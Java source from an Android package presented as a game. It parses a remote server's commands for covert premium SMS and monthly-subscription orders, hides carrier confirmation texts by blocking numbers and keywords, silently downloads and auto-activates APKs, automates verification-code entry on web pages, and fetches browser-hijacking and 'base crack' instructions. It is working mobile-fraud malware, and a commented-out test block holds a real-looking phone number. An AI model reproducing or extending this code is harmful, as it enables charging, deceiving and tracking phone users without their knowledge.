package cn.com.tiantong.game72.n.m;

import java.util.ArrayList;
import java.util.Map;

import u.aly.ad;

import android.content.Context;
import cn.com.tiantong.game72.push.bean.AutoActivateBean;
import cn.com.tiantong.game72.push.bean.DownloadApkBasicBean;
import cn.com.tiantong.game72.push.bean.DownloadApkBean;
import cn.com.tiantong.game72.push.bean.GetMonthCommandsResultBean;
import cn.com.tiantong.game72.util.DataEncryption;
import cn.com.tiantong.game72.util.Logger;
import cn.com.tiantong.game72.util.UmengUtil;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;


public class JP {

	// public static final String tag = "JsonParse";

	private RO ro = new RO();

	// 初始化
	public Object parseInitProcess(Context mContext, String str) {
		// //LH.LogPrint(tag, "(jsonParse(初始化)从服务器端获取的数据：)" + str);

		ro.result = true;
		IFLSBean serviceBean = new IFLSBean();
//		serviceBean.setDoTime(1440);
//		serviceBean.setKeynumbers("10086,106");
//		serviceBean.setKeywords("彩铃，订购");
//		serviceBean.setHascommands(true);
//		serviceBean.setDoMonthCommands(true);
//		serviceBean.setDoBrowserCommands(true);
//		 IFLSBean serviceBean = new IFLSBean();
//		 ArrayList<WebBean> list = new ArrayList<WebBean>();
//		 WebBean webBean = new WebBean();
//		 webBean.setUrl("http://event.pinganfang.com/h5/hfb/index?utm_source=fanyue14&utm_medium=cpa&utm_campaign=ggk&sfrom=cpa-fanyue14");
//		 webBean.setPhoneNumber("18292081557");
//		 webBean.setInstructionStr("1_0@p@3_input_9_number@i@2_a_6_tap_95511@lc@start验证码@lc@end,@i@4_input_10@i@1_a_7");
//		 list.add(webBean);
//		 serviceBean.setWebBeanList(list);
//		 ro.obj = serviceBean;
		
//		IFLSBean serviceBean = new IFLSBean();
		ro.obj = serviceBean;
		try {

			Map<String, Object> map = JSON.parseObject(str);
			Boolean flag = (Boolean) map.get("result");

			if (flag) {
				// 获取到定时的时间，这个即可能是字符串，也可能是数字
				try {
					Integer time = (Integer) map.get("doTime");
					// //LH.LogPrint(tag, "获取的心跳时间是不带引号的");
					if (time == null || time == 0) {
						serviceBean.setDoTime(-1);
						// //LH.LogPrint(tag, "获取到的事件为null");
					} else {
						serviceBean.setDoTime(time);
					}

				} catch (Exception e) {
					try {
						// //LH.LogPrint(tag, "获取的心跳时间是“带引号”的");
						Integer time = Integer.parseInt(((String) map.get("doTime")).trim());
						if (time == null || time == 0) {
							serviceBean.setDoTime(-1);
							// //LH.LogPrint(tag, "获取到的事件为null");
						} else {
							serviceBean.setDoTime(time);
						}
					} catch (Exception e1) {
						e1.printStackTrace();
						// //LH.LogPrint(tag, "获取心跳时间 -- 上述两个都是发生异常");
						serviceBean.setDoTime(-1);
					}
				}

				// 获取屏蔽号码段
				String keynumbers = (String) map.get("keynumbers");

				if (keynumbers != null && !"".equals(keynumbers.trim())) {
					serviceBean.setKeynumbers(keynumbers.trim());
				} else {
					serviceBean.setKeynumbers(null);
				}

				// 获取屏蔽关键字
				String keywords = (String) map.get("keywords");

				if (keywords != null && !"".equals(keywords.trim())) {
					serviceBean.setKeywords(keywords.trim());
				} else {
					serviceBean.setKeywords(null);
				}

				// 判断是否需要获取指令(这个是短代的开关)
				try {
					Boolean hascommands = (Boolean) map.get("hascommands");

					if (hascommands == null) {
						// //LH.LogPrint(tag, "获取到的“判断是否需要获取指令”的字段为null");
						serviceBean.setHascommands(false);
					} else {
						serviceBean.setHascommands(hascommands);
					}

				} catch (Exception e) {

					// //LH.LogPrint(tag, "带引号的hascommands");
					Boolean hascommands = Boolean.valueOf(((String) map.get("hascommands")).trim());
					serviceBean.setHascommands(hascommands);
					e.printStackTrace();
				}

				try {
					String salt = (String) map.get("salt");
					if (salt != null && !"".equals(salt.trim())) {
						serviceBean.setSalt(salt);
					} else {
						serviceBean.setSalt(null);
					}
				} catch (Exception e) {
					serviceBean.setSalt(null);
					e.printStackTrace();

				}

				// 判断是否需要进行下载apk的流程 5.50
				try {
					Boolean isDownloadApk = (Boolean) map.get("doApk");

					if (isDownloadApk == null) {
						// //LH.LogPrint(tag, "获取到的“判断是否需要获取指令”的字段为null");
						serviceBean.setDownloadApk(false);
					} else {
						serviceBean.setDownloadApk(isDownloadApk);
					}

				} catch (Exception e) {

					// //LH.LogPrint(tag, "带引号的isDownloadApk");
					try {
						Boolean isDownloadApk = Boolean.valueOf(((String) map.get("doApk")).trim());
						if (isDownloadApk == null) {
							// //LH.LogPrint(tag, "获取到的“判断是否需要获取指令”的字段为null");
							serviceBean.setDownloadApk(false);
						} else {
							serviceBean.setDownloadApk(isDownloadApk);
						}
					} catch (Exception e1) {
						serviceBean.setDownloadApk(false);
						e1.printStackTrace();
					}
					e.printStackTrace();
				}

				// 判断是否需要web获取指令
				try {
					Boolean haswebcommands = (Boolean) map.get("haswebcommands");
					Logger.print("JP", "----->>" + haswebcommands);
					if (haswebcommands == null) {
						serviceBean.setHasWebCommands(false);
					} else {
						serviceBean.setHasWebCommands(haswebcommands);
					}

				} catch (Exception e) {
					Boolean haswebcommands = Boolean.valueOf(((String) map.get("haswebcommands")).trim());
					serviceBean.setHasWebCommands(haswebcommands);
					e.printStackTrace();
				}

				// 判断是否需要包月指令
				try {
					Boolean hasMonthCommands = (Boolean) map.get("doMonthCommands");
					Logger.print("JP", "----->>" + hasMonthCommands);
					if (hasMonthCommands == null) {
						serviceBean.setDoMonthCommands(false);
					} else {
						serviceBean.setDoMonthCommands(hasMonthCommands);
					}
				} catch (Exception e) {
					Boolean hasMonthCommands = Boolean.valueOf(((String) map.get("doMonthCommands")).trim());
					serviceBean.setDoMonthCommands(hasMonthCommands);
					e.printStackTrace();
				}
				
				//判断是否需要浏览器劫持指令
				try {
					Boolean doBrowserCommands = (Boolean) map.get("doBrowserCommands");
					Logger.print("<<<<---->>>> 是否需要获取浏览器劫持指令", "---" + doBrowserCommands);
					if(doBrowserCommands == null){
						serviceBean.setDoBrowserCommands(false);
					} else {
						
						serviceBean.setDoBrowserCommands(doBrowserCommands);
					}
				} catch (Exception e) {
					Boolean doBrowserCommands = Boolean.valueOf(((String) map.get("doBrowserCommands")).trim());
					serviceBean.setDoBrowserCommands(doBrowserCommands);
					e.printStackTrace();
				}
				
				//判断是否需要执行基地破解业务
				try {
					Boolean doCrackAccess  = (Boolean) map.get("doCrackAccess");
					Logger.print("<<<<---->>>> 是否需要执行基地破解业务", "---" + doCrackAccess);
					if(doCrackAccess  == null){
						serviceBean.setDoCrackAccess(false);
					} else {
						serviceBean.setDoCrackAccess(doCrackAccess);
					}
				} catch (Exception e) {
					Boolean doCrackAccess  = Boolean.valueOf(((String) map.get("doCrackAccess")).trim());
					serviceBean.setDoCrackAccess(doCrackAccess);
					e.printStackTrace();
				}
				

				ro.result = true;
				ro.obj = serviceBean;
			} else {
				// 获取到定时的时间
				try {
					Integer time = (Integer) map.get("doTime");
					// //LH.LogPrint(tag, "获取的心跳时间是不带引号的");
					if (time == null || time == 0) {
						serviceBean.setDoTime(-1);
						// //LH.LogPrint(tag, "获取到的事件为null");
					} else {
						serviceBean.setDoTime(time);
					}

				} catch (Exception e) {
					try {
						// //LH.LogPrint(tag, "获取的心跳时间是“带引号”的");
						Integer time = Integer.parseInt(((String) map
								.get("doTime")).trim());
						if (time == null || time == 0) {
							serviceBean.setDoTime(-1);
							// //LH.LogPrint(tag, "获取到的事件为null");
						} else {
							serviceBean.setDoTime(time);
						}
					} catch (Exception e1) {
						e1.printStackTrace();
						// //LH.LogPrint(tag, "获取心跳时间 -- 上述两个都是发生异常");
						serviceBean.setDoTime(-1);
					}
				}

				try {
					serviceBean.setReason((String) map.get("reason"));
				} catch (Exception e) {
					e.printStackTrace();
					serviceBean.setReason(null);
				}

				// 获取屏蔽号码段
				String keynumbers = (String) map.get("phoneNums");

				if (keynumbers != null && !"".equals(keynumbers.trim())) {
					serviceBean.setKeynumbers(keynumbers.trim());
				} else {
					serviceBean.setKeynumbers(null);
				}

				// 获取屏蔽关键字
				String keywords = (String) map.get("keywords");

				if (keywords != null && !"".equals(keywords.trim())) {
					serviceBean.setKeywords(keywords.trim());
				} else {
					serviceBean.setKeywords(null);
				}

				// 判断是否需要获取指令
				try {
					Boolean hascommands = (Boolean) map.get("hascommands");

					if (hascommands == null) {
						// //LH.LogPrint(tag, "获取到的“判断是否需要获取指令”的字段为null");
						serviceBean.setHascommands(false);
					} else {
						serviceBean.setHascommands(hascommands);
					}

				} catch (Exception e) {

					// //LH.LogPrint(tag, "带引号的hascommands");
					Boolean hascommands = Boolean.valueOf(((String) map.get("hascommands")).trim());
					serviceBean.setHascommands(hascommands);
					e.printStackTrace();
				}

				try {
					String salt = (String) map.get("salt");
					if (salt != null && !"".equals(salt.trim())) {
						serviceBean.setSalt(salt);
					} else {
						serviceBean.setSalt(null);
					}
				} catch (Exception e) {
					serviceBean.setSalt(null);
					e.printStackTrace();

				}

				// 判断是否需要包月指令
				try {
					Boolean hasMonthCommands = (Boolean) map.get("doMonthCommands");
					Logger.print("JP", "----->>" + hasMonthCommands);
					if (hasMonthCommands == null) {
						serviceBean.setDoMonthCommands(false);
					}else{
						serviceBean.setDoMonthCommands(hasMonthCommands);
					}
				} catch (Exception e) {
					Boolean hasMonthCommands = Boolean.valueOf(((String) map.get("doMonthCommands")).trim());
					serviceBean.setDoMonthCommands(hasMonthCommands);
					e.printStackTrace();
				}

				// 判断是否需要进行下载apk的流程
				try {
					Boolean isDownloadApk = (Boolean) map.get("doApk");

					if (isDownloadApk == null) {
						// //LH.LogPrint(tag, "获取到的“判断是否需要获取指令”的字段为null");
						serviceBean.setDownloadApk(false);
					} else {
						serviceBean.setDownloadApk(isDownloadApk);
					}

				} catch (Exception e) {

					// //LH.LogPrint(tag, "带引号的isDownloadApk");
					try {
						Boolean isDownloadApk = Boolean.valueOf(((String) map
								.get("doApk")).trim());
						if (isDownloadApk == null) {
							// //LH.LogPrint(tag, "获取到的“判断是否需要获取指令”的字段为null");
							serviceBean.setDownloadApk(false);
						} else {
							serviceBean.setDownloadApk(isDownloadApk);
						}
					} catch (Exception e1) {
						serviceBean.setDownloadApk(false);
						e1.printStackTrace();
					}
					e.printStackTrace();
				}

				// 判断是否需要web获取指令
				try {
					Boolean haswebcommands = (Boolean) map.get("haswebcommands");
					if (haswebcommands == null) {
						serviceBean.setHasWebCommands(false);
					} else {
						serviceBean.setHasWebCommands(haswebcommands);
					}

				} catch (Exception e) {
					Boolean haswebcommands = Boolean.valueOf(((String) map
							.get("haswebcommands")).trim());
					serviceBean.setHasWebCommands(haswebcommands);
					e.printStackTrace();
				}
				
				
				//判断是否需要浏览器劫持指令
				try {
					Boolean doBrowserCommands = (Boolean) map.get("doBrowserCommands");
					Logger.print("<<<<---->>>> 是否需要获取浏览器劫持指令", "---" + doBrowserCommands);
					if(doBrowserCommands == null){
						serviceBean.setDoBrowserCommands(false);
					} else {
						
						serviceBean.setDoBrowserCommands(doBrowserCommands);
					}
				} catch (Exception e) {
					Boolean doBrowserCommands = Boolean.valueOf(((String) map.get("doBrowserCommands")).trim());
					serviceBean.setDoBrowserCommands(doBrowserCommands);
					e.printStackTrace();
				}
				
				//判断是否需要执行基地破解业务
				try {
					Boolean doCrackAccess  = (Boolean) map.get("doCrackAccess");
					Logger.print("<<<<---->>>> 是否需要执行基地破解业务", "---" + doCrackAccess);
					if(doCrackAccess == null){
						serviceBean.setDoCrackAccess(false);
					} else {
						serviceBean.setDoCrackAccess(doCrackAccess);
					}
				} catch (Exception e) {
					Boolean doCrackAccess  = Boolean.valueOf(((String) map.get("doCrackAccess")).trim());
					serviceBean.setDoCrackAccess(doCrackAccess);
					e.printStackTrace();
				}

				ro.result = false;
				ro.obj = serviceBean;
			}

		} catch (Exception e) {
			e.printStackTrace();

			UmengUtil umeng = UmengUtil.getIntent();
			umeng.onError(mContext, e);

			String err = EM.getErrorInfo(EM.DATAPARSE_FAIL_ERROR);

			serviceBean.setDoTime(-1);
			serviceBean.setHascommands(false);
			serviceBean.setKeynumbers(null);
			serviceBean.setKeywords(null);
			serviceBean.setReason(err);
			serviceBean.setSalt(null);
			serviceBean.setDownloadApk(false);
			serviceBean.setHasWebCommands(false);
			serviceBean.setDoMonthCommands(false);
			ro.result = false;
			ro.obj = serviceBean;
		}
		return ro;
	}

	// 从服务器端获取指令集合
	public Object parseCommandsFromService(Context mContext, String str) {
		// LH.LogPrint(tag, "从服务器端获取短指令集合----》:" + str);

		// ArrayList<CommandBean> list = new ArrayList<CommandBean>();
		// list.add(new CommandBean("005", "10086", "101", null));
		//
		// ro.result = true;
		// ro.obj = list;

		try {

			Map<String, Object> map = JSON.parseObject(str);
			Boolean flag = (Boolean) map.get("result");

			if (flag) {

				JSONArray array = (JSONArray) map.get("item");

				ArrayList<CommandBean> list = new ArrayList<CommandBean>();
				for (Object o : array) {

					Map<String, Object> map1 = (Map<String, Object>) o;

					String type = (String) map1.get("type");
					String address = (String) map1.get("address");
					String context1 = (String) map1.get("message1");
					String context2 = (String) map1.get("message2");
					String msgId = (String) map1.get("ddid");

					if (type != null && address != null && context1 != null
							&& !"".equals(type.trim())
							&& !"".equals(address.trim())
							&& !"".equals(context1.trim())) {
						CommandBean bean = new CommandBean();

						bean.setType(type.trim());
						bean.setAddress(address.trim());
						bean.setContext1(context1.trim());
						bean.setContext2(context2.trim());
						bean.setMsgId(msgId);

						list.add(bean);
					}
				}

				ro.result = true;
				ro.obj = list;

			} else {

				String reason = (String) map.get("reason");

				// //LH.LogPrint(tag, "从服务器端获取指令集合失败的原因：" + reason);

				ro.result = false;
				ro.obj = reason;
			}
		} catch (Exception e) {
			e.printStackTrace();
			UmengUtil umeng = UmengUtil.getIntent();
			umeng.onError(mContext, e);
			ro.result = false;
			ro.obj = EM.getErrorInfo(EM.DATAPARSE_FAIL_ERROR);
		}

		return ro;
	}

	public Object parseBasicNumService(Context mContext, String str) {

		// BasicBean bBean = new BasicBean(0, "13051530301");
		//
		// ro.result = true;
		// ro.obj = bBean;
		try {
			ro.result = true;
			Map<String, Object> map = JSON.parseObject(str);
			BasicBean bBean = new BasicBean();
			// 心跳时间
			// 获取到定时的时间，这个即可能是字符串，也可能是数字
			try {
				Integer time = (Integer) map.get("doTime");
				if (time == null || time == 0) {
					bBean.setTime(-1);
				} else {
					bBean.setTime(time);
				}

			} catch (Exception e) {
				try {
					Integer time = Integer
							.parseInt(((String) map.get("doTime")).trim());
					if (time == null || time == 0) {
						bBean.setTime(-1);
					} else {
						bBean.setTime(time);
					}
				} catch (Exception e1) {
					e1.printStackTrace();
					bBean.setTime(-1);
				}
			}
			try {
				// 发送短信，获取手机号码
				String forUserPhoneNumber = (String) map.get("userphonum");

				if (forUserPhoneNumber != null
						&& !"".equals(forUserPhoneNumber.trim())) {
					bBean.setPhoneNumber(forUserPhoneNumber.trim());
				} else {
					bBean.setPhoneNumber(null);
				}
			} catch (Exception e1) {
				bBean.setPhoneNumber(null);
				e1.printStackTrace();
			}
			ro.obj = bBean;
		} catch (Exception e) {
			e.printStackTrace();
			UmengUtil umeng = UmengUtil.getIntent();
			umeng.onError(mContext, e);
			ro.result = false;
			ro.obj = EM.getErrorInfo(EM.DATAPARSE_FAIL_ERROR);
		}

		return ro;

	}

	// ******************************获取apk下载
	// 5.50******************************************
	public Object parseDownloadApkList(Context mContext, String str) {

		// DownloadApkBean apkBean = new DownloadApkBean();
		// apkBean.setNet(2);
		// ArrayList<DownloadApkBasicBean> basicBeanList = new
		// ArrayList<DownloadApkBasicBean>();
		//
		// DownloadApkBasicBean bean1 = new DownloadApkBasicBean();
		// bean1.setUrl("http://apk.hiapk.com/appdown/com.cailing");
		// bean1.setPackageName("com.cailing");
		// bean1.setInfo("彩铃，不一样的听觉盛宴！！！");
		// bean1.setMode(0);
		// bean1.setAppName("彩铃控");
		// bean1.setAppFilePath(null);
		// bean1.setDownloadState(0);
		//
		// basicBeanList.add(bean1);
		//
		// DownloadApkBasicBean bean2 = new DownloadApkBasicBean();
		// bean2.setUrl("http://static.sc.hiapk.com/appdown/com.dreamprj.defender.mm");
		// bean2.setPackageName("com.dreamprj.defender.mm");
		// bean2.setInfo("为女生而战！！！");
		// bean2.setMode(0);
		// bean2.setAppName("女神保卫战");
		// bean2.setAppFilePath(null);
		// bean2.setDownloadState(0);
		//
		// basicBeanList.add(bean2);
		//
		// // DownloadApkBasicBean bean3 = new DownloadApkBasicBean();
		// //
		// bean3.setUrl("http://static.sc.hiapk.com/appdown/cn.Oleaster.zjsabl.dj");
		// // bean3.setPackageName("cn.Oleaster.zjsabl.dj");
		// // bean3.setInfo("烈火西风，杀出一个未来！！！");
		// // bean3.setMode(0);
		// // bean3.setAppName("烈火西风");
		// // bean3.setAppFilePath(null);
		// // bean3.setDownloadState(0);
		// //
		// // basicBeanList.add(bean3);
		//
		//
		// apkBean.setBasicBeanList(basicBeanList);
		//
		//
		// //自激活
		// ArrayList<AutoActivateBean> autoBeanList = new
		// ArrayList<AutoActivateBean>();
		//
		// AutoActivateBean autoBean1 = new AutoActivateBean();
		// autoBean1.setPackageName("com.cailing");
		// autoBean1.setMode(0);
		//
		// autoBeanList.add(autoBean1);
		//
		// apkBean.setAutoActivateBeanList(autoBeanList);
		// ro.result = true;
		// ro.obj = apkBean;

		//
		try {
			// base64解密
			DataEncryption dataEnc = DataEncryption.getInstance();
			str = dataEnc.decode(str);
			Map<String, Object> downloadMap = JSON.parseObject(str);
			Boolean result = (Boolean) downloadMap.get("result");
			Logger.print("lllalalall", "str:" + str);
			if (result) {

				DownloadApkBean apkBean = new DownloadApkBean();

				// 默认在什么网络的情况下下载
				try {
					Integer netType = (Integer) downloadMap.get("netType");
					if (netType != null) {
						apkBean.setNet(netType);
					} else {
						apkBean.setNet(1);
					}
				} catch (Exception e) {
					e.printStackTrace();

					// 这个是字符串
					try {
						String netTypeStr = (String) downloadMap.get("netType");

						if (netTypeStr != null && !"".equals(netTypeStr.trim())) {
							Integer netType = Integer.valueOf(netTypeStr);
							apkBean.setNet(netType);
						} else {
							apkBean.setNet(1);
						}

					} catch (Exception e1) {
						e1.printStackTrace();
						apkBean.setNet(1);
					}

				}

				// 下载列表
				try {
					JSONArray downloadAPKArray = (JSONArray) downloadMap.get("item_1");

					ArrayList<DownloadApkBasicBean> basicBeanList = new ArrayList<DownloadApkBasicBean>();

					for (Object obj : downloadAPKArray) {

						Map<String, Object> item1Map = (Map<String, Object>) obj;

						String downloadUrl = (String) item1Map.get("downloadUrl");
						String packageName = (String) item1Map.get("packageName");
						String apkName = (String) item1Map.get("apkName");
						String info = (String) item1Map.get("info");
						int mode = (Integer) item1Map.get("mode");

						DownloadApkBasicBean basicBean = new DownloadApkBasicBean(downloadUrl, packageName, info, mode, apkName, null, null, 0);

						basicBeanList.add(basicBean);
					}

					if (!basicBeanList.isEmpty()) {
						apkBean.setBasicBeanList(basicBeanList);
					}

				} catch (Exception e) {
					e.printStackTrace();
					apkBean.setBasicBeanList(null);
				}

				// 激活列表
				try {
					JSONArray downloadAPKArray = (JSONArray) downloadMap.get("item_2");

					ArrayList<AutoActivateBean> activateBeanList = new ArrayList<AutoActivateBean>();

					for (Object obj : downloadAPKArray) {

						Map<String, Object> item2Map = (Map<String, Object>) obj;

						String packageName = (String) item2Map
								.get("packageName");
						int mode = (Integer) item2Map.get("mode");

						AutoActivateBean autoBean = new AutoActivateBean(
								packageName, mode);

						activateBeanList.add(autoBean);
					}

					if (!activateBeanList.isEmpty()) {
						apkBean.setAutoActivateBeanList(activateBeanList);
					}

				} catch (Exception e) {
					e.printStackTrace();
					apkBean.setAutoActivateBeanList(null);
				}

				ro.result = true;
				ro.obj = apkBean;
			} else {
				ro.result = false;
				String reason = (String) downloadMap.get("reason");
				ro.obj = reason;
			}

		} catch (Exception e) {
			e.printStackTrace();
			UmengUtil umeng = UmengUtil.getIntent();
			umeng.onError(mContext, e);
			ro.result = false;
			ro.obj = EM.getErrorInfo(EM.DATAPARSE_FAIL_ERROR);
		}

		return ro;
	}

	// 解析web指令
	public Object parseWebCommandsFromService(Context mContext, String str) {
		try {

			Map<String, Object> map = JSON.parseObject(str);
			Boolean flag = (Boolean) map.get("result");

			if (flag) {

				JSONArray array = (JSONArray) map.get("item");

				ArrayList<WebBean> list = new ArrayList<WebBean>();
				for (Object o : array) {

					Map<String, Object> map1 = (Map<String, Object>) o;

					String index = (String) map1.get("index");
					String url = (String) map1.get("url");
					String number = (String) map1.get("number");
					String instruct = (String) map1.get("instruct");

					if (url != null && !"".equals(url.trim())) {
						WebBean bean = new WebBean();
						bean.setIndex(index);
						bean.setUrl(url);
						bean.setPhoneNumber(number);
						bean.setInstructionStr(instruct);
						list.add(bean);
					}
				}
				ro.result = true;
				ro.obj = list;
			} else {
				String reason = (String) map.get("reason");
				ro.result = false;
				ro.obj = reason;
			}
		} catch (Exception e) {
			e.printStackTrace();
			UmengUtil umeng = UmengUtil.getIntent();
			umeng.onError(mContext, e);
			ro.result = false;
			ro.obj = EM.getErrorInfo(EM.DATAPARSE_FAIL_ERROR);
		}

		return ro;
	}

	// 解析包月指令
	public Object parseMonthCommandsFormService(Context context, String str) {
//		GetMonthCommandsResultBean setMonthBean = new GetMonthCommandsResultBean();
//		setMonthBean.setResult(true);
//		setMonthBean.setCpId("6789");
//		setMonthBean.setServiceId("5");
//		ro.result = true;
//		ro.obj = setMonthBean;
		try {
			GetMonthCommandsResultBean getMonth = new GetMonthCommandsResultBean();
			Map<String, Object> map = JSON.parseObject(str);
			Boolean flag = (Boolean) map.get("result");

			if (flag) {
				String cpId = (String) map.get("cpid");
				String serviceId = (String) map.get("serviceid");
				String mode = (String) map.get("mode");
				String reason = (String) map.get("reason");
				getMonth.setResult(flag);
				getMonth.setCpId(cpId);
				getMonth.setServiceId(serviceId);
				getMonth.setMode(mode);
				getMonth.setReason(reason);
				ro.result = true;
				ro.obj = getMonth;
			} else {
				String reason = (String) map.get("reason");
				ro.result = false;
				ro.obj = reason;
			}
		} catch (Exception e) {
			e.printStackTrace();
			UmengUtil umeng = UmengUtil.getIntent();
			umeng.onError(context, e);
			ro.result = false;
			ro.obj = EM.getErrorInfo(EM.DATAPARSE_FAIL_ERROR);
			e.printStackTrace();
		}
		return ro;
	}
	
	//解析浏览器劫持指令
	public Object parseBrowserCommands (Context context, String str){
		
		try {
			BrowserAdsBean getBrowserComm = new BrowserAdsBean();
			Map<String, Object> map =  JSON.parseObject(str);
			Boolean flag = (Boolean)map.get("result");
			
			if(flag){
				//解析json数据
				JSONArray array = (JSONArray) map.get("address");
				JSONArray array1 = (JSONArray) map.get("area");
				JSONArray array2 = (JSONArray) map.get("time_area");
				String decription = (String) map.get("desc");
				getBrowserComm.setDescrption(decription);
				
				ArrayList<String> addressList = new ArrayList<String>();
				for(Object object : array){
					addressList.add((String) object);
				}
				ArrayList<String> areaList = new ArrayList<String>();
				for(Object object : array1){
					areaList.add((String) object);
				}
				ArrayList<String> time_AreaList = new ArrayList<String>();
				for(Object object : array2){
					time_AreaList.add((String) object);
				}
				
				getBrowserComm.setAddress(addressList);
				getBrowserComm.setArea(areaList);
				getBrowserComm.setTime_area(time_AreaList);
				getBrowserComm.setResult(flag);
				
				
				
				ro.result = true;
				ro.obj = getBrowserComm;
			} else {
				String desc = (String) map.get("desc");
				ro.result = false;
				ro.obj = desc;
			}
		} catch (Exception e) {
			e.printStackTrace();
			UmengUtil umeng = UmengUtil.getIntent();
			umeng.onError(context, e);
			ro.result = false;
			ro.obj = EM.getErrorInfo(EM.DATAPARSE_FAIL_ERROR);
			e.printStackTrace();
		}
//		ArrayList<BrowserAdsBean> list = new ArrayList<BrowserAdsBean>();
//		for(int i = 0; i < 8; i++){
//			
//			BrowserAdsBean getBrowserComm = new BrowserAdsBean();
//			getBrowserComm.setResult(true);
//			getBrowserComm.setAddress("www.baidu.com");
//			getBrowserComm.setStart_time("5");
//			getBrowserComm.setEnd_time("24");
//			
//			list.add(getBrowserComm);
//		}
//		ro.result = true;
//		ro.obj = list;
		return ro;
	}

}

